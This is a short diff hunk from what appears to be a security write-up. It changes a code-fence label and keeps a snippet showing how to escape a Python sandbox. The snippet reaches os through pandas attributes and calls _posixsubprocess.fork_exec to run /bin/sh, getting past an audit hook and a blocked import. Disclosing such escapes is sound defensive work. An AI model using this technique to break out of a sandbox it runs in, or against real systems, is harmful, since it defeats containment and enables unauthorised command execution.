@@ -52,7 +52,7 @@ The Python sandbox's process controls were all Python-level: the audit hook deni
 blocked `import subprocess`. But every module pandas has already loaded is reachable by
 attribute access, with no import at all:
 
-```python
+```text
 o = pd.io.common.os
 m = o.sys.modules['_posixsubprocess']
 m.fork_exec([b'/bin/sh', b'-c', b'id'], [b'/bin/sh'], True, (), None, None, -1, -1, -1, w, -1, w, er, ew, ...)
